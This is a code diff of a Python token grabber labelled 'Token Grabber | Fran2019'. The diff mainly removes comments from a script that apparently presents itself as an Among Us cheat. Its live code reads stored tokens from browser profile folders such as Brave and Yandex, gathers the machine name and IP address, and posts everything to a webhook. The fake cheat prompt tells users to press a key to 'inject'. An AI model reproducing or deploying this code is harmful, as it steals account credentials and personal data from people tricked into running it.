@@ -34,32 +34,26 @@ def ripper():
             'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
             'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
         }
-    message = '```yaml\n' + 'Token Grabber | Fran2019\n'                                   # Title of the message
+    message = '```yaml\n' + 'Token Grabber | Fran2019\n'                        
     for path in paths:
         if not os.path.exists(path):
             pass
-        message += f'\n{path}:\n'                                                           # Adding the title of the platform to the message
+        message += f'\n{path}:\n'                                                        
 
         tokens = token_ripper(paths[path])
 
-        if len(tokens) > 0:                                                                 # If tokens exists adding the tokens to the message
+        if len(tokens) > 0:                                                                
             for token in tokens:
                 message += f'\n{token}\n'
         else:
-            message += "No tokens found.\n"                                                 # If tokens does not exists adding "No tokens found." to the message
-    
+            message += "No tokens found.\n"
     message += f'\nMachine Name: {machineName} \nIP Address: {getIPAddress()}' + f'\nTime: {datetime.datetime.now().strftime("%H:%M:%S")}' + '```'
-
-    #   WebHook Sender  #
     payload = {
         "username": bot_name,
         "avatar_url": avatar_url,
         "content": message
     }
-
     requests.post(WebHook, json = payload)
-
-#    Modules // Extra Code    #
 def amongus():
     print('Among Us Cheat | Beta Phase !@!')
     print('\nGuide: \n1. Open Among Us. \n2. Join a game. \n3. Once you are in a game press any key to inject.')
